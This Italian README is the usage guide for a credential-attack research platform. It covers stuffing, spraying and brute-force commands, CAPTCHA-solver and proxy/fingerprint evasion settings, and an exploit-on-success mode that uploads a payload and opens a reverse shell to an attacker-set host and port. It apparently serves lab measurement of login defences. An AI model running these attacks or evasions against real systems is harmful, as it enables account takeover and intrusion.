# Credential Attack Platform — guida rapida all'uso

> ⚠️ **Solo laboratorio autorizzato.** Strumento dual-use per red teaming / pentest
> su bersagli consenzienti. Non usare contro sistemi di terzi.

Questo file spiega **come lanciare il motore da riga di comando** e **come è fatto
il file di configurazione**. Non descrive l'architettura interna: serve a chi
domani vuole aprire, configurare e far girare un test.

---

## 1. Preparazione (una volta sola)

```bash
# 1. crea ed attiva un virtualenv
python -m venv .venv
.venv\Scripts\activate        # Windows
# source .venv/bin/activate   # Linux/Kali

# 2. installa le dipendenze
pip install -r requirements.txt

# 3. SOLO se usi il backend Camoufox: scarica il Firefox patchato (una volta)
camoufox fetch
```

Note:
- Il backend **`cdp`** (Chrome/SeleniumBase) non richiede `camoufox fetch`.
- La chiave del solver CAPTCHA si passa via **variabile d'ambiente**, mai nel config:
  ```bash
  set CAPSOLVER_API_KEY=la_tua_chiave      # Windows
  export CAPSOLVER_API_KEY=la_tua_chiave   # Linux/Kali
  ```
- La cartella `logs/` viene creata da sola alla prima esecuzione.

---

## 2. Lanciare il motore

Entry point: **`main.py`**. Tre sottocomandi: `attack`, `proxy-check`, `intel-scan`.
Il config di default è `config.yaml` (cambialo con `--config <file>`).

> **Regola d'oro:** un **`--run-id` nuovo** per ogni esecuzione. Il logger scrive
> in *append*: riusare lo stesso id mescola run diverse nello stesso file.

### Attacco — credential stuffing (lista user:pass)
```bash
python main.py attack --target portal-ip --attack-type stuffing \
  --combo-list data/exp_stuffing.txt --run-id R1
```

### Attacco — password spray (molti utenti, poche password)
```bash
python main.py attack --target portal-ip --attack-type spray \
  --usernames data/exp_spray_users.txt --passwords data/exp_spray_pw.txt --run-id R2
```

### Attacco — brute force (un utente, molte password)
```bash
python main.py attack --target portal-ip --attack-type bruteforce \
  --username vittima --passwords data/exp_bruteforce_pw.txt --run-id R3
```
> Nel motore la concorrenza si imposta da `concurrency.max_workers` nel config
> (non da CLI). Per le celle per-account (lockout/rate-limit) tienila a **1**.

### Opzioni utili su `attack`
| Flag | A che serve |
|------|-------------|
| `--use-proxy` | Usa il pool di proxy (`proxy.source_file` nel config) con rotazione accoppiata IP+fingerprint. |
| `--mutation` | Applica il motore di mutazione delle credenziali. |
| `--defense-config <etichetta>` | Etichetta delle difese del target (es. `baseline`, `lockout`, `rate_limit`). **Solo log**, non cambia il comportamento. |
| `--evasion-config <etichetta>` | Etichetta del regime di evasione (default derivata: `backend[+proxy][+backoff]`). Solo log. |
| `--captcha-type` | `turnstile` \| `recaptcha_v2` \| `recaptcha_v3` \| `auto`. Override di `config.captcha.type`. |
| `--captcha-solver` | `none` (subisci/misura il blocco) \| `capsolver` (risolvi). |
| `--captcha-key` | Chiave API del solver (override; meglio usare `CAPSOLVER_API_KEY`). |

### Attacco con CAPTCHA (vhost Turnstile)
```bash
python main.py attack --target portal-turnstile --attack-type stuffing \
  --combo-list data/exp_stuffing.txt \
  --captcha-solver capsolver --captcha-type turnstile --run-id R4
```

### Attacco + exploit (Cella A: credenziale valida → upload → reverse shell)
> SOLO lab/LAN, IP privati, niente proxy. `--exploit-lhost` = **IP LAN della macchina
> che lancia il motore** (callback della shell). Serve la porta del listener aperta
> in ingresso sul firewall.
```bash
python main.py attack --target portal-local --attack-type stuffing \
  --combo-list data/exp_stuffing.txt \
  --exploit-on-success --exploit-lhost 192.168.1.42 --exploit-lport 4444 \
  --defense-config upload_vuln --run-id EXP1
```

### Altri sottocomandi
```bash
python main.py proxy-check                          # verifica salute del pool proxy
python main.py intel-scan --emails-file data/emails.txt   # check email su HaveIBeenPwned
```

### GUI desktop (Tkinter): crea config + esegue + analizza
```bash
pythonw run_gui.pyw
```

---

## 3. Attaccante di CONTROLLO (HTTP puro, niente browser/evasione)

`naive_http_attack.py` isola la variabile "trasporto": stessa struttura di log,
confrontabile con l'engine via `analyze_logs.py`. Config separata `config_naive.yaml`.
```bash
python naive_http_attack.py --config config_naive.yaml --target portal-ip \
  --combo-list data/exp_stuffing.txt --defense-config baseline --run-id N1
# per-account (lockout/rate-limit): --workers 1 ; per-IP/volume: --workers 5
```

---

## 4. Analisi dei log

```bash
python analyze_logs.py --valid 1 logs/attacks-R1-*.jsonl           # metriche di una run
python analyze_logs.py --valid 1 --aggregate --csv out.csv logs/attacks-R1-*.jsonl
```
`--valid N` = n. di credenziali valide piazzate (serve al recall). `--aggregate`
media per cella con IC95%. Metriche: recall, block_rate, ATD, throughput, n_identità,
più il breakdown CAPTCHA quando presente.

---

## 5. Il file di configurazione (`config.yaml`)

YAML a sezioni. Qui sotto cosa fa ciascuna e cosa si tocca di solito.

| Sezione | Cosa controlla | Chiavi che toccherai |
|---------|----------------|----------------------|
| `concurrency` | Worker paralleli (finestre browser). | `max_workers`: **1** per celle per-account (lockout/rate-limit), alto per volume per-IP. |
| `rate_limit` | Ritardo tra tentativi per worker (low-and-slow). | `min_delay_s`, `max_delay_s`, `jitter_s`. |
| `browser` | Backend e finestra. | `backend`: `cdp` (Chrome) \| `camoufox` (Firefox); `headless`: true/false; `timeout_s`. |
| `camoufox` | Opzioni del backend Camoufox (usate solo se `backend: camoufox`). | `os` (`windows/macos/linux/random`), `geoip`, `humanize`. Con `geoip: true` **timezone, geolocalizzazione e lingua sono derivati dall'IP di uscita** (del proxy se presente). Per forzare una lingua fissa aggiungi `locale: it-IT`; se la ometti la decide l'IP. |
| `identity` | Durata di un'identità (sessione viva: proxy+fingerprint+locale) prima di ruotare. | `requests_per_identity_min`/`_max` (budget casuale); `requests_per_identity` fallback. |
| `backoff` | Feedback adattivo sugli esiti. | `enabled`; `lockout_cooldown_s` (allinea alla policy del target); `block_base_delay_s`, `block_max_delay_s`, `backoff_factor`. |
| `proxy` | Pool di proxy (usato con `--use-proxy`). | `source_file` (una riga per proxy: `host:port` o `user:pass@host:port`), `rotation` (`round_robin`/`random`). |
| `logging` | Dove scrive i log JSONL. | `output_dir` (default `logs`). |
| `wazuh` | Lettura alert dall'Indexer (opzionale). | `host`, `port`, credenziali. Lascia `host: ""` se non usato. |
| `hibp` | Chiave HaveIBeenPwned per `intel-scan`. | `api_key`. |
| `captcha` | Gestione CAPTCHA nel flusso browser. | `type` (`auto` rileva dal DOM), `solver` (`none`/`capsolver`), `auto_wait_s` (attesa per invisible). Chiave via env. |
| `exploit` | Modulo post-exploitation (Cella A). | `enabled` o flag `--exploit-*`; `lhost` (IP LAN attaccante), `lport`, `upload_path`, `payload`. Solo lab/LAN. |
| `targets` | Elenco dei bersagli. | vedi sotto. |

### Definire un target (`targets:`)
Ogni voce è un bersaglio richiamabile con `--target <name>`. Campi per un form HTTP:
```yaml
- name: portal-ip
  base_url: "https://v2.uni-portal.it/login.php"
  login_type: http_form          # http_form | ldap | ssh
  username_selector: "#username" # selettori CSS del form di login
  password_selector: "#password"
  submit_selector: "button[type='submit']"
  success_indicator: "a[href='logout.php']"   # elemento presente SOLO da loggati
  failure_indicator: ".alert-error"           # credenziali errate
  lockout_indicator: ".alert-warning"         # account bloccato (D1)
  block_indicator: ".alert-rate"              # rate-limit / 429 (D2a)
  # captcha_sitekey: "0x..."                  # opzionale sui target con CAPTCHA
```
- **`ldap`**: usa `ldap_server`, `ldap_base_dn`, `ldap_user_dn_template`.
- **`ssh`**: usa `ssh_host`, `ssh_port`.
- Gli `*_indicator` sono il modo in cui il motore classifica l'esito
  (`SUCCESS/FAILURE/LOCKED/BLOCKED`): se cambi il portale, aggiorna i selettori.

---

## 6. Promemoria operativi

- **Esiti**: `SUCCESS / FAILURE / LOCKED / BLOCKED / ERROR`. `ERROR` è rumore infra,
  tenuto separato dai blocchi nelle analisi.
- **Reset stato lab tra le run**: sul portale `TRUNCATE login_attempts; TRUNCATE
  account_lockouts;` (+ restart Apache; + pulizia `uploads/` se hai usato l'exploit).
- **Concorrenza per cella**: per-account (lockout/rate-limit) → `--workers 1`
  (c'è una race nota sul contatore a workers>1); per-IP/volume → concorrenza alta.
